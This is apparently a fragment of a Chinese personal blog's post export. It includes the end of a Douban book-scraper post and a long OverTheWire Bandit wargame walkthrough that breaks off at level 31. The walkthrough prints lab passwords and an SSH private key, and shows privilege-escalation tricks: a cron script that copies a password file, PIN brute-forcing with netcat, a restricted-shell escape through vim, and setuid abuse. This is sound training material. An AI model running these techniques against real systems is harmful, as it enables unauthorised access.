\u0026#34;\u0026#34; try: resp = requests.get(url, headers=head) html = resp.text print(resp.status_code) except requests.exceptions.RequestException as e: print(\u0026#34;An error occurred\u0026#34;, str(e)) return html def getData(baseurl): count = 0 for i in range(0, 300): url = baseurl + str(i * 20) html = askUrl(url) links = re.findall(findLink, html) for link in list(filter(lambda link: \u0026#34;buylinks\u0026#34; not in link, links)): newurl = \u0026#34;https://book.douban.com/subject/\u0026#34; + link time.sleep(5) html = askUrl(newurl) data = [] try: count += 1 # 书名 title = re.findall(findTitle, html)[0] #图片链接 imgsrc = re.findall(findImgSrc, html)[0] #出版日期 date = re.findall(findDate, html)[0] #图书作者 author = re.findall(findAuthor, html)[0] #出版商 publish = re.findall(findPublish, html)[0][2] #编号 code = re.findall(findCode, html)[0] #描述 decr = re.findall(findDes, html)[0] data.append(title) data.append(decr) data.append(date) data.append(author) data.append(publish) data.append(f\u0026#34;ISBN: {code}\u0026#34;) data.append(imgsrc) save(data) if count == 1000: exit(\u0026#34;爬取完成\u0026#34;) except: continue def main(): baseurl = \u0026#34;https://book.douban.com/tag/经典?type=T\u0026amp;start=\u0026#34; getData(baseurl) if __name__ == \u0026#39;__main__\u0026#39;: main() ​\t运行之后，常常会出现403码，估计还是访问太快导致的，不过当时要求只是一定量的数据即可，所以有些数据没爬到就算了。\n​\t本来想长篇大论的详细说说代码是怎么写的，但里面知识点挺多的，全说的话不知道该怎么讲。还是后面有时间写个基础爬虫的文章算了。\n","date":"2024-01-16T17:48:22+08:00","image":"https://gcore.jsdelivr.net/gh/wingllllet/pic_bed@img//img/2402281848.jpg","permalink":"https://blog.winglet.com/p/%E7%88%AC%E5%8F%96%E8%B1%86%E7%93%A3%E5%9B%BE%E4%B9%A6%E4%BF%A1%E6%81%AF/","title":"爬取豆瓣图书信息"},{"content":"ok，我的2024年第一篇博客就此展开，回顾一下我的2023年，这一年里我领到了校赛证书，互联网+证书，认识了一群大佬，并且通过我舍友介绍去挣了大学第一桶金。不过总的来看，这一年还是一个摆烂的一年。不过这两年走过来，我也有了一定的方向，希望2024年我能坚持学习下去。完成2024年的目标。 ","date":"2024-01-15T11:46:02+08:00","image":"https://gcore.jsdelivr.net/gh/wingllllet/pic_bed@img/img/2.jpg","permalink":"https://blog.winglet.com/p/hello-world/","title":"Hello World"},{"content":"前言 ​\t搬运一下我自己写的笔记给我的博客，让我的博客充实些，不能建完就甩到一边了。不得不说个人博客让我有一种什么都想往上写的感觉，之前也在csdn写过东西，后面不写主要是感觉麻烦，自己的笔记上传过去图片经常加载不出来，所以在csdn写的话图片少还好说，图片多了真就望而却步了。\n介绍 ​\tbandit是over the wire推出的一个为提升linux基础的系统靶场，目前共有33关，适合小白学习和增强linux命令操作。靶场网址：https://overthewire.org/wargames/bandit/\nwp level 0 题目描述 此级别的目标是让您使用 SSH 登录游戏。您需要连接的主机是 bandit.labs.overthewire.org，端口为 2220。用户名是bandit0，密码是bandit0。登录后，转到第 1 级页面，了解如何通过第 1 级。\n解决方法 ssh bandit0@bandit.labs.overthewire.org -p 2220 level 0 题目描述 下一级的密码存储在 主目录中名为readme的文件中。使用此密码通过 SSH 登录 bandit1。每当您找到某个关卡的密码时，请使用 SSH（在端口 2220 上）登录该关卡并继续游戏。\n解决方法 ls cat readme readme: NH2SXQwcBdpmTEzi3bvBHMM9H66vVXjL level 1 题目描述 下一级的密码存储在 主目录中名为-的文件\n解决方法 ls cat ./- 因为-在shell中是一个特殊字符，如果我们想要它只把它看作为一个字符，我们需要在前面加上./这就是告诉bash shell不需要解释为特殊字符\nreadme: rRGizSaX8Mk1RTb1CNQoXTcYZWU6lgzi level 2 题目描述 下一级的密码存储在主目录中名为space的文件中\n解决方法 ls -al cat \u0026#34;spaces in this filename\u0026#34; cat spaces/ in/ this/ filename 在bash shell中空格会将命令隔开，也就将文件名不会视为一个整体\n，这里我们有两种方法解决，第一种就是用双引号包裹，让它认为这是一个整体，第二种就是用\\ 让它把空格符也作为普通字符并拼接起来。\nreadme： aBZ0W5EmUfAf7kHTQeOwd8bauFJ2lAiG level 3 题目描述 下一级的密码存储在 inhere目录中的隐藏文件中。\n解决方法 ls cd inhere ls -al cat .hidden 当文件名的前面加上.后，它就会变为隐藏文件，这时我们只用ls命令是看不见该文件的存在的，所以我们需要加参数-al这样就可以显示当前目录下的所有文件。\nreadme: 2EW7BBsr6aMMoJ2HjW067dm8EgX26xNe level 4 题目描述 下一级的密码存储在inhere目录中唯一人类可读的文件中。提示：如果您的终端出现问题，请尝试“重置”命令。\n解决方法 cd inhere file ./* cat ./-file07 在inhere目录下，有很多文件，这些文件里面只有file07里面才有真正的内容，我们可以一个一个打开文件，查看里面的内容，或者使用file ./* ， 对当前目录下的所有文件进行文件类型的检测。\n这样我们就能知道哪个文件里面\nreadme: lrIWWI6bB37kxfiCQZqUdOIYfr6eEeqR level 5 题目描述 下一级的密码存储在inhere目录下的某个文件中，并具有以下所有属性：\n人类可读的 大小为 1033 字节 不可执行 解决方法 cd inhere find . -type f -size 1033c cd maybehere07 ls cat .file2 find . -type f -size 文件大小单元 f: 类型为文件 b -- 块 (512字节) c -- 字节 w -- 字 (2字节) k -- 千字节 M -- 兆字节 G -- 吉字节 \u0026ldquo;find\u0026rdquo; 是一个命令行工具，用于在文件系统中搜索文件和目录。 \u0026ldquo;.\u0026rdquo; 表示当前目录，作为搜索的起始点。 \u0026ldquo;-type f\u0026rdquo; 是一个条件选项，用于指定只搜索普通文件（排除目录和其他特殊文件）。 \u0026ldquo;-size 1033c\u0026rdquo; 是一个条件选项，用于指定搜索文件大小为 1033 字节。 readme: P4L4vucdmLnm8I7Vl7jG1ApGSfjYKqJU level 6 题目描述 下一级的密码存储在服务器上的某个位置，并具有以下所有属性：\n由用户 bandit7 拥有 归强盗6集团所有 大小为 33 字节 解决方法 find / -user bandit7 -group bandit6 -size 33c /: 从根目录找起 -user: 文件由用户uname所有（允许使用数字用户 ID） -group: 文件属于组gname（允许使用数字组 ID） 找到一堆无权限文件，但那些都不重要\nreadme: z7WtoNQU2XfjmMtWA8u5rN4vzqu4v99S level 7 题目描述 下一级的密码存储在文件data.txt中 millionth 单词旁边\n解决方法 grep millionth data.txt 执行命令 \u0026ldquo;grep millionth data.txt\u0026rdquo; 会在 \u0026ldquo;data.txt\u0026rdquo; 文件中搜索包含 \u0026ldquo;millionth\u0026rdquo; 的文本行，并将匹配到的行输出到终端。\nreadme: TESKZC0XvTetK0S9xNwm25STk5iWrBvP level 8 题目描述 下一级的密码存储在文件data.txt中 ，并且是唯一只出现一次的文本行\n解决方法 sort data.txt | uniq -u sort -- 是一个命令行工具，用于对文本文件进行排序。 | -- 是管道符号，用于将前一个命令的输出作为后一个命令的输入。 uniq -- 是一个命令行工具，用于查找和删除连续重复的行。 -u -- 是 \u0026#34;uniq\u0026#34; 命令的选项，用于仅输出不重复的行 readme: EN632PlfYiZbn3PhVK3XOGSlNInNE00t level 9 题目描述 下一级的密码存储在文件data.txt中 ，位于少数几个人类可读的字符串之一中，前面有几个“=”字符。\n解决方法 这里的data.txt是一个二进制文件，用grep是没法查找了，所以我们要把这个文件里的数据转为可打印字符。\nstrings data.txt | grep = strings -- 是一个命令行工具，用于从二进制文件中提取可打印的字符串。 这里我们还有别的办法，我们也可以用xxd命令，它可以把该文件内容作为16进制输出，这样我们也可以用grep命令查找\nreadme: G7w8LIi6J3kTb8A7j9LgrywtEUlyyp6s level 10 题目描述 下一级的密码存储在文件data.txt中，其中包含base64编码的数据\n解决方法 cat data.txt | base64 -d base -d data.txt -d -- base64的命令选项，可以把base64编码解密并输出 readme: 6zPeziLdR2RKNdNYFNb6nVCKzphlXHBM level 11 题目描述 下一级的密码存储在文件data.txt中，其中所有小写 (az) 和大写 (AZ) 字母均已旋转 13 个位置\n解决方法 cat data.txt | tr \u0026#34;a-zA-Z\u0026#34; \u0026#34;n-za-mN-ZA-M\u0026#34; tr -- 字符替换操作 a-zA-Z -- 表示要替换的字符范围 n-za-mN-ZA-M -- 将字符按照偏移量为13的逆序进行替换 这关也可以把文件内容复制出来，然后找个凯撒解密工具解决。\nreadme: JVNBBFSmZwKKOP0XbFXOoW8chDz5yVRv level 12 题目描述 下一级的密码存储在文件data.txt中，该文件是经过反复压缩的文件的十六进制转储。对于此级别，在 /tmp 下创建一个目录可能会很有用，您可以在其中使用 mkdir 进行工作。例如：mkdir /tmp/myname123。然后使用 cp 复制数据文件，并使用 mv 重命名它（阅读手册页！）\n解决方法 mkdir -p /tmp/winglet cp data.txt /tmp/winglet cd /tmp/winglet xxd -r data.txt \u0026gt; data.bin file data.bin mv data.bin data.gz gzip -d data.gz file data mv data data.bz gzip -d data.bz file data mv data data.gz gzip -d data.gz file data mv data data.tar tar vxf data.tar file data5.bin mv data5.bin data.tar tar vxf data.tar file data6.bin mv data6.bin data.bz bzip2 -d data.bz file data mv data data.tar tar vxf data.tar file data8.bin mv data8.bin data.gz gzip -d data.gz file data.gz file data cat data xxd -- 用于在十六进制和其他进制之间进行转换，并以不同的格式显示文件的内容 -r -- xxd的选项 将十六进制转换为二进制格式。 bzip2 -- 一个常用的压缩和解压缩工具 -d -- bzip2的一个选项 解压缩文件，恢复为原始文件 gzip -- 一个常用的压缩和解压缩工具 -d -- gzip的一个选项 解压缩文件，恢复为原始文件 tar -- 一个常用的归档工具 -x -- 提取归档文件 -v -- 显示详细的操作信息。 -f -- 指定归档文件的名称。 readme: wbWdlBxEir4CaE8LaPhauuOo6pwRmrDw level 13 题目描述 下一级的密码存储在 /etc/bandit_pass/bandit14 中，并且只能由用户 bandit14 读取。对于此级别，您不会获得下一个密码，但您会获得可用于登录下一个级别的 SSH 私钥。 注意： localhost是指您正在使用的计算机的主机名\n解决方法 ls cat sshkey.private sshkey.private: -----BEGIN RSA PRIVATE KEY----- MIIEpAIBAAKCAQEAxkkOE83W2cOT7IWhFc9aPaaQmQDdgzuXCv+ppZHa++buSkN+ gg0tcr7Fw8NLGa5+Uzec2rEg0WmeevB13AIoYp0MZyETq46t+jk9puNwZwIt9XgB ZufGtZEwWbFWw/vVLNwOXBe4UWStGRWzgPpEeSv5Tb1VjLZIBdGphTIK22Amz6Zb ThMsiMnyJafEwJ/T8PQO3myS91vUHEuoOMAzoUID4kN0MEZ3+XahyK0HJVq68KsV ObefXG1vvA3GAJ29kxJaqvRfgYnqZryWN7w3CHjNU4c/2Jkp+n8L0SnxaNA+WYA7 jiPyTF0is8uzMlYQ4l1Lzh/8/MpvhCQF8r22dwIDAQABAoIBAQC6dWBjhyEOzjeA J3j/RWmap9M5zfJ/wb2bfidNpwbB8rsJ4sZIDZQ7XuIh4LfygoAQSS+bBw3RXvzE pvJt3SmU8hIDuLsCjL1VnBY5pY7Bju8g8aR/3FyjyNAqx/TLfzlLYfOu7i9Jet67 xAh0tONG/u8FB5I3LAI2Vp6OviwvdWeC4nOxCthldpuPKNLA8rmMMVRTKQ+7T2VS nXmwYckKUcUgzoVSpiNZaS0zUDypdpy2+tRH3MQa5kqN1YKjvF8RC47woOYCktsD o3FFpGNFec9Taa3Msy+DfQQhHKZFKIL3bJDONtmrVvtYK40/yeU4aZ/HA2DQzwhe ol1AfiEhAoGBAOnVjosBkm7sblK+n4IEwPxs8sOmhPnTDUy5WGrpSCrXOmsVIBUf laL3ZGLx3xCIwtCnEucB9DvN2HZkupc/h6hTKUYLqXuyLD8njTrbRhLgbC9QrKrS M1F2fSTxVqPtZDlDMwjNR04xHA/fKh8bXXyTMqOHNJTHHNhbh3McdURjAoGBANkU 1hqfnw7+aXncJ9bjysr1ZWbqOE5Nd8AFgfwaKuGTTVX2NsUQnCMWdOp+wFak40JH PKWkJNdBG+ex0H9JNQsTK3X5PBMAS8AfX0GrKeuwKWA6erytVTqjOfLYcdp5+z9s 8DtVCxDuVsM+i4X8UqIGOlvGbtKEVokHPFXP1q/dAoGAcHg5YX7WEehCgCYTzpO+ xysX8ScM2qS6xuZ3MqUWAxUWkh7NGZvhe0sGy9iOdANzwKw7mUUFViaCMR/t54W1 GC83sOs3D7n5Mj8x3NdO8xFit7dT9a245TvaoYQ7KgmqpSg/ScKCw4c3eiLava+J 3btnJeSIU+8ZXq9XjPRpKwUCgYA7z6LiOQKxNeXH3qHXcnHok855maUj5fJNpPbY iDkyZ8ySF8GlcFsky8Yw6fWCqfG3zDrohJ5l9JmEsBh7SadkwsZhvecQcS9t4vby 9/8X4jS0P8ibfcKS4nBP+dT81kkkg5Z5MohXBORA7VWx+ACohcDEkprsQ+w32xeD qT1EvQKBgQDKm8ws2ByvSUVs9GjTilCajFqLJ0eVYzRPaY6f++Gv/UVfAPV4c+S0 kAWpXbv5tbkkzbS0eaLPTKgLzavXtQoTtKwrjpolHKIHUz6Wu+n4abfAIRFubOdN /+aLoRQ0yBDRbdXMsZN/jvY44eM+xRLdRVyMmdPtP8belRi2E2aEzA== -----END RSA PRIVATE KEY----- 将这个私钥复制后，在桌面新建一个空白文件，并把该内容输入进去，之后利用他连接bandit14\nchmod 600 id_rsa ssh -i id_rsa bandit14@bandit.labs.overthewire.org -p 2220 cat /etc/bandit_pass/bamdit14 readme: fGrHPx402xGC7U7rXKDaxiWFTOiF0ENq level 14 题目描述 将当前级别的密码提交到localhost 的 30000 端口即可获取下一级的密码。\n解决方法 nc localhost 30000 echo fGrHPx402xGC7U7rXKDaxiWFTOiF0ENq | nc localhost 30000 telnet localhost 30000 nc -- 是一个网络工具，用于在网络上进行数据传输。它可以用于创建 TCP 或 UDP 连接、发送和接收数据，以及进行端口扫描等操作。 nc \u0026lt;目标主机\u0026gt; \u0026lt;目标端口\u0026gt; \u0026lt; 文件 -- 发送文件 telnet -- 一种用于远程登录和网络通信的协议和工具 readme: jN2kgmIXJ6fShzhT2avhotn4Zcka6tnt level 15 题目描述 通过使用 SSL 加密将当前级别的密码提交到localhost 的 30001 端口，可以检索下一级的密码。\n有用的注释：获得“HEARTBEATING”和“Read R BLOCK”？使用 -ign_eof 并阅读联机帮助页中的“连接命令”部分。除了“R”和“Q”之外，“B”命令也适用于该命令的此版本\u0026hellip;\u0026hellip;\n解决方法 openssl s_client -connect localhost:30001 openssl -- 一个开源的加密工具包，提供了一组用于处理加密、解密、签名、验证等操作的命令行工具 ssl协议 -- 一种用于在计算机网络上进行安全通信的协议。SSL的目标是通过使用加密和身份验证机制，确保在客户端和服务器之间传输的数据的保密性、完整性和可信性。 s_client -- 用于在命令行中模拟 SSL/TLS 客户端的行为 -connect -- 指定要连接的主机和端口 example： openssl s_client -connect example.com:443 readme: JQttfApK4SeyHwDlI9SXGR50qclOAil1 level 16 题目描述 可以通过将当前级别的密码提交到本地主机上 31000 到 32000 范围内的端口来检索下一个级别的凭据。首先找出服务器正在监听哪些端口。然后找出哪些使用 SSL，哪些不使用 SSL。只有一台服务器会提供下一个凭据，其他服务器只会将您发送给它的任何内容发送回给您。\n解决方法 nmap -sV -T4 lcoalhost -p 31000-32000 -sV -- 使用版本探测功能，尝试确定目标主机上运行的服务和其版本信息。 -T4 -- 设置扫描速度为“快速”模式，以更高的速度执行扫描。 openssl s_client -connect localhost:31790 chmod 600 id_rsa ssh -i id_rsa bandit17@bandit.labs.overthewire.org -p 2220 cat /etc/bandit_pass/bandit14 readme: VwOSWtCA7lRKkTfbr2IDh6awj9RNZM5e level 17 题目描述 主目录中有2个文件：passwords.old和passwords.new。下一级的密码位于 passwords.new中，并且是 passwords.old和password.new之间唯一已更改的行\n注意：如果您已解决此级别并看到“再见！” 当尝试登录 bandit18 时，这与下一个级别 bandit19 有关\n解决方法 diff passwords.new password.old diff -- 用于比较文件和目录之间的差异 readme: hga5tuuCLF6fFzUpnagiMN8ssu9LFrdg level 18 题目描述 下一级的密码存储在主目录中的自述文件中。不幸的是，有人修改了.bashrc ，以便在您使用 SSH 登录时将您注销。\n解决方法 cat /etc/shells /etc/shells -- 是一个位于 Unix/Linux 系统中的文件路径，它包含了系统中可用的登录 shell 列表。这个文件用于指定哪些用户 shell 可以用于登录系统。 ssh bandit18@bandit.labs.overthewire.org -p 2220 -t /bin/sh cat readme /bin/sh -- Sh 是一种最早出现的 Unix Shell，它由 Stephen Bourne 开发。Sh 是许多 Unix 系统默认的标准 Shell。它提供了基本的命令行解释功能，允许用户执行命令、运行脚本和控制系统。Sh 在功能和语法方面相对简单，缺乏一些现代 Shell 的高级特性。 /bin/bash -- Bash 是 Sh 的增强版本，由 Brian Fox 开发。Bash 在功能和语法上扩展了 Sh，提供了更多的特性和工具。Bash 兼容 Sh，因此可以执行 Sh 脚本，并且可以使用更多的命令和语法扩展。Bash 是许多 Linux 系统默认的 Shell，并且也广泛用于其他 Unix 系统。 readme: awhqfNnAbc1naukrpqDYcF95h7HoMTrC level 19 题目描述 要访问下一个级别，您应该使用主目录中的 setuid 二进制文件。不带参数执行它以了解如何使用它。使用 setuid 二进制文件后，可以在通常的位置 (/etc/bandit_pass) 找到此级别的密码。\n解决方法 ./bandit20-do cat /etc/bandit_pass/bandit20 SUID (Set User ID) 和 SGID (Set Group ID) 是 Unix/Linux 系统中的两个特殊权限位，用于设置可执行文件的权限。 在这里该文件的拥有者是bandit20然后bandit19拥有使用权，当该文件具有suid权限的时候，这就意味着普通用户在执行该文件的时候，会以文件所有者的身份执行，为不是以执行者自己的身份。\n设置suid权限的母的是允许欧通用户以特权用户的身份去执行某些特定的命令或程序，而在这种情况下，bandit19可以用bandit20的身份执行命令。\n而这个二进制文件的功能是自定义的。\nreadme: VxCazJaVykI6W36BkBU0mJTCM8rR95XT level 20 题目描述 主目录中有一个 setuid 二进制文件，它执行以下操作：它在您指定为命令行参数的端口上建立到本地主机的连接。然后，它从连接中读取一行文本，并将其与上一级别 (bandit20) 中的密码进行比较。如果密码正确，则会传送下一级（bandit21）的密码。\n注意：尝试连接到您自己的网络守护程序，看看它是否按您的想法工作\n解决方法 nc -lv -p 0 \u0026lt; /etc/bandit_pass/bandit20 \u0026amp; nc -- 它是一个网络工具，用于在不同主机之间进行数据传输和网络连接 -lv -- 参数用于指定 nc 命令以监听模式运行，并打印接收到的数据。 -p -- 参数用于指定监听端口。在这个示例中，端口号被设置为 0，代表随机选择一个可用的端口进行监听。 \u0026lt; -- 将/etc/bandit_pass/bandit20文件的内容作为输入提供给前面的命令 \u0026amp; -- 符号用于将命令放入后台执行，以便继续在终端中执行其他命令。 ./suconnect 23333 readme: NvEJF7oVjkddltPSrdKEFOllh9V1IBcq level 21 题目描述 程序从 基于时间的作业调度程序cron定期自动运行。查看 /etc/cron.d/中的配置并查看正在执行什么命令。\n解决方法 cron 是一个在 Unix/Linux 系统上用于执行预定任务的定时任务调度器。它允许用户创建和管理定期执行的任务，这些任务可以是脚本、命令或任何可执行程序。Cron 基于 crontab（cron table）文件来定义和配置这些任务。\ncd /etc/cron.d ls cat cronjob_bandit22 这样我们就知道，程序在定时执行/usr/bin/cronjob_bandit22.sh文件的内容。\ncat /usr/bin/cronjob_bandit22.sh 以此可知，他把密码放在了/tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv\ncat /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv readme: WdDozAdTM2z9DiFEQ2mGlwngMfj4EZff level 22 题目描述 程序从 基于时间的作业调度程序cron定期自动运行。查看/etc/cron.d/中的配置并查看正在执行什么命令。\n注意：查看其他人编写的 shell 脚本是一项非常有用的技能。此级别的脚本有意使之易于阅读。如果您在理解它的作用时遇到问题，请尝试执行它以查看它打印的调试信息。\n解决方法 cat /etc/cron.d/cronjob_bandit23 cat /usr/bin/cronjob_bandit23.sh echo I am user bandit23 | md5sum | cut -d \u0026#39; \u0026#39; -f 1 cat /tmp/8169b67bd894ddbb4412f91573b38db3 readme: QYw0Y2aiA672PsMmh9puTQuhoz8SyR2G level 23 题目描述 程序从 基于时间的作业调度程序cron定期自动运行。查看/etc/cron.d/中的配置并查看正在执行什么命令。\n注意：此级别要求您创建自己的第一个 shell 脚本。这是非常大的一步，当你通过这个关卡时，你应该为自己感到自豪！\n注意 2：请记住，您的 shell 脚本一旦执行就会被删除，因此您可能需要保留一份副本\u0026hellip;\u0026hellip;\n解决方法 根据描述先查看/etc/cron.d文件\ncd /etc/cron.d ls 查看与bandit24有关的\ncat cronjob_bandit24 cron是一个用于在Linux和类Unix系统上执行预定任务的工具。/etc/crontab文件是系统范围的cron配置文件，其中包含了各个用户的定时任务。 cron作业的条目，它会在每次系统启动时以bandit24用户身份执行/usr/bin/cronjob_bandit24.sh脚本，并将输出重定向到/dev/null。 查看bandit24.sh内容\ncat /usr/bin/cronjob_bandit24.sh cronjob_bandit24.sh #!/bin/bash # 获取当前用户名，因为该文件运行权限是bandit24，所以该变量存储 bandit24 myname=$(whoami) # 进入目录 cd /var/spool/$myname/foo # 打印信息 echo \u0026#34;Executing and deleting all scripts in /var/spool/$myname/foo:\u0026#34; # 遍历目录中的所有文件和目录（包括隐藏文件和目录） for i in * .*; do # 检查文件或目录是否不是当前目录（\u0026#34;.\u0026#34;）或父目录（\u0026#34;..\u0026#34;） if [ \u0026#34;$i\u0026#34; != \u0026#34;.\u0026#34; -a \u0026#34;$i\u0026#34; != \u0026#34;..\u0026#34; ]; then # 打印信息 echo \u0026#34;Handling $i\u0026#34; # 使用 stat 命令获取文件的所有者，并将其存储在 owner 变量中 owner=\u0026#34;$(stat --format \u0026#34;%U\u0026#34; ./$i)\u0026#34; # 判断用户是否bandit23 if [ \u0026#34;${owner}\u0026#34; = \u0026#34;bandit23\u0026#34; ]; then # 如果是bandit23则使用 timeout 在60秒内执行该文件 timeout -s 9 60 ./$i fi # 删除文件 rm -f ./$i fi done 根据上面的代码信息我们可以知道，如果我们用bandit23用户创建一个脚本文件并存入 /bandit24/foo/ 目录内的话，是可以在60秒内执行的，所以我们可以创建一个脚本，让它可以获取bandit24的密码。那么我们的思路就是在tmp目录下创建一个目录，并在里面创建脚本，因为tmp目录下我们是有写文件权限的，然后脚本内容就是把bandit24的密码存入一个文件里。 创建脚本\nmkdir /tmp/rand cd /tmp/rand vim script.sh cp script.sh /var/spool/bandit24 script.sh #!/bin/bash cat /etc/bandit_pass/bandit24 \u0026gt; /tmp/rand/password 这时我们还需要，给tmp/rand一个任何用户都能写文件的权限，不然，bandit24在运行脚本时，会因为没有权限导致不能写文件。\nchmod 777 -R /tmp/rand 接下来就是等一会儿\nls cat password readme: VAfGXJ1PBSsPSnvsjI8p759leLZ9GGar level 24 题目描述 守护程序正在侦听端口 30002，如果给定 bandit24 的密码和秘密数字 4 位 pincode，它将为您提供 bandit25 的密码。除非通过所有 10000 个组合（称为暴力破解），否则无法检索 pin 码。 您不需要每次都创建新连接\n解决方法 根据描述可以知道我们这次要进行爆破了，脚本内容如下：\n#!/bin/bash for i in {5000..9999}; do echo \u0026#34;VAfGXJ1PBSsPSnvsjI8p759leLZ9GGar $i\u0026#34; done | nc localhost 30002 创建文件\nmkdir /tmp/randit24 vim rand.sh ./rand.sh readme: p7TaowMYrmu23Ol8hiZh9UvD0O9hpx8d level 25 题目描述 从 bandit25 登录 bandit26 应该相当容易……用户 bandit26 的 shell 不是/bin/bash，而是其他东西。了解它是什么、它是如何工作的以及如何摆脱它。\n解决方法 ls cat bandit26 使用这个key尝试登录bandit26\nchmod 600 id_rsa ssh -i id_rsa bandit26@bandit.labs.overthewire.org -p 2220 连接失败，我们知道bandit26用户使用的shell不是默认/bin/bash\n所以可以查看一下默认shell信息\ncat /etc/passwd /etc/passwd -- 一个在类Unix操作系统中存储用户账户信息的文件。它是一个文本文件，每一行代表一个用户账户，并使用冒号（:）分隔不同的字段。它包含了系统中所有用户名、组ID、用户主目录、默认shell等信息。 bandit26:x:11026:11026:bandit level 26:/home/bandit26:/usr/bin/showtext 1. bandit26 -- 用户名，表示用户的登录名 2. x -- 密码字段，以前曾在此处存储用户密码，但现在已经被单独存储在/etc/shadow文件中，并以占位符 x 表示 3. 11026 -- 用户ID(UID)，是系统为每个用户分配的唯一数字标识符 4. 11026 -- 组ID(GID)，是用户所属的组的唯一数字标识符 5. bandit level 26 -- 用户的注释字段，用于描述用户的一些额外信息，例如用户的姓名或角色 6. /home/bandit26 -- 用户主目录，表示用户登录后所在的初始目录 7. /usr/bin/showtext -- 默认shell, 指定用户登录后使用的命令行解释器 查看默认shell\ncat /usr/bin/showtext exec more ~/text.txt -- 这行代码使用\u0026#39;exec\u0026#39;命令来代替当前进程并执行 more ~/text.txt 命令。more 命令用于逐页显示文件内容，这里将显示用户的主目录下的 text.txt 文件 核心：注销的原因是exit 0 行，该行在显示 text.txt 文件中的所有文本后立即执行。 如果需要在终端上显示的内容量大于终端的大小，more 工具就会进入交互模式，知道我们退出为止。所以只要我们不查看文件的所有内容，就不会直接退出程序。 所以我们可以先缩小终端尺寸，然后再以bandit26身份登录，这样就不会注销，并且能处于更多的交互模式\nssh -i bandit26.sshkey bandit26@localhost -p 2220 然后我们可以按\u0026rsquo;v\u0026rsquo;进入vim编辑器，在vim中有一个命令模式，可以执行系统命令\n:set shell=/bin/bash #显式地将外部shell设置为bash，以确保在执行外部命令时使用bash解释器 接下来我们再执行下一个命令\n:shell # 在当前vim会话中启动一个新的子shell终端 # 在vim中执行 :shell 命令时，vim会暂时编辑会话并打开一个新的shell终端，可以在这个shell终端中执行任何命令 # 这个功能可以在不离开Vim的情况下执行一些临时的命令或查看其他文件，然后回到编辑会话继续工作 cat /etc/bandit_pass/bandit26 readme: c7GvcKlw9mC7aUQaPx7nwFstuAIBw1o1 level 26 题目描述 干得好，得到一个外壳！现在赶快获取 bandit27 的密码吧！\n解决方法 在bandit26中有一个bandit27-do的二进制文件，查看属性\n可以发现设置了suid权限，所以我们在使用这个文件时她便具有文件所有者相应的权限。\n./bandit27-do cat /etc/badnit_pass/bandit27 readme: YnQpBuifNMas1hcUFk70ZmqkhUU2EuaS level 27 题目描述 ssh://bandit27-git@localhost/home/bandit27-git/repo通过 port有一个 git 存储库2220。用户的密码bandit27-git与用户的密码相同bandit27。\n克隆存储库并找到下一级的密码。\n解决方法 在/home目录下有一个bandit27-git文件，但是我们没有访问权限，所以我们可以在tmp目录下新建一个文件夹，然后克隆仓库\nmkdir -p /tmp/bandit27-git cd /tmp/bandit27-git git clone ssh://bandit27-git@localhost:2220/home/bandit27-git/repo cd repo cat README git clone -- 是一个Git命令，用于将远程Git仓库复制（克隆）到本地计算机上。它创建一个与远程仓库相同的副本，使你能够在本地进行代码的修改、提交和其他操作，而不会影响到远程仓库。 readme: AVanL161y9rsbcJIsFHuw35rjaOM19nR level 28 题目描述 ssh://bandit28-git@localhost/home/bandit28-git/repo通过 port有一个 git 存储库2220。用户的密码bandit28-git与用户的密码相同bandit28。\n克隆存储库并找到下一级的密码。\n解决方法 前面的方法一样\nmkdir -p /tmp/bandit28 git clone ssh://bandit-git@localhost:2220/home/bandit28-git/repo cd repo 但是这里的README.md文件里的没有下一级的密码。我们可以查看文件更新日志\ngit log git log -- 命令将显示按时间顺序列出的提交记录，包括每个提交的作者、提交日期、提交信息和唯一的提交哈希值 提交 14f754b3ba6531a2b89df6ccae6446e8969a41f3 (HEAD -\u0026gt; master, origin/master, origin/HEAD) 作者：Morla Porla morla@overthewire.org 日期：2023年10月5日 06:19:41 +0000 修复信息泄漏 提交 f08b9cc63fa1a4602fb065257633c2dae6e5651b 作者：Morla Porla morla@overthewire.org 日期：2023年10月5日 06:19:41 +0000 添加缺失的数据 提交 a645bcc508c63f081234911d2f631f87cf469258 作者：Ben Dover noone@overthewire.org 日期：2023年10月5日 06:19:41 +0000 README.md 的初始提交 这里我们要用的是第二个。\ngit checkout f08b9cc63fa1a4602fb065257633c2dae6e5651b cat README.md git checkout -- 用于切换到不同的分支、恢复文件的特定版本或创建新的分支。 readme: tQKvmcwNYcFS6vmPHIUSI3ShmsrQZK8S level 29 题目描述 ssh://bandit29-git@localhost/home/bandit29-git/repo通过 port有一个 git 存储库2220。用户的密码bandit29-git与用户的密码相同bandit29。\n克隆存储库并找到下一级的密码。\n解决方法 前面方法一致\nmkdir -p /tmp/bandit29 cd /tmp/bandit29 git clone ssh://bandit29-git@localhost:2220/home/bandit29-git/repo cd repo cat README.md 在这里production可能是一个分支，所以我们可以查看所有分支\ngit branch -a git branch -- 命令将列出仓库中所有的本地分支。当前活动的分支会以星号标记。 然后我们查看dev分支，切换到dev分支\ngit checkout remotes/origin/dev readme： xbhV3HpNGlTIdnjUrdAlPzc2L6y9EOnS level 30 题目描述 ssh://bandit30-git@localhost/home/bandit30-git/repo通过 port有一个 git 存储库2220。用户的密码bandit30-git与用户的密码相同bandit30。\n克隆存储库并找到下一级的密码。\n解决方法 mkdir -p /tmp/bandit30 cd /tmp/bandit30 git clone ssh://bandit30-git@localhost:2220/home/bandit30-git/repo cd repo cat README.md 文件中无有用内容，并且查看了日志和分支也没有有用部分，这时我们还可以查看标签\ngit tag git tag -- 用于管理和查看标签（tag） 查看里面内容\ngit show secret git show -- 这将显示特定标签的详细信息，包括提交哈希、作者、日期和注释等。 readme: OoffzGDlzhAlerFJ2cAiz1D41JW1Mhmt level 31 题目描述 ssh://bandit31-git@localhost/home/bandit31-git/repo通过 port有一个 git 存储库2220。用户的密码bandit31-git与用户的密码相同bandit31。\n克隆存储库并找到下一级的密码。\n解决方法 mkdir -p /tmp/bandit31 cd /tmp/bandit31 git clone ssh://bandit31-git@localhost:2220/home/bandit31-git/repo cd repo cat README.md 要求发送文件到远程仓库\nls .gitignore 文件里面记录的是不能被储存的文件\ncat .gitignore 也就是说只要是后缀为txt的文件，都不会被推送到远程仓库，所以我们要先将它删除，然后再推胸文件\nrm .gitignore echo \u0026#34;May I come in?\u0026#34; \u0026gt; key.txt git add . git commit -m \u0026#34;task\u0026#34; git push origin master git add . -- 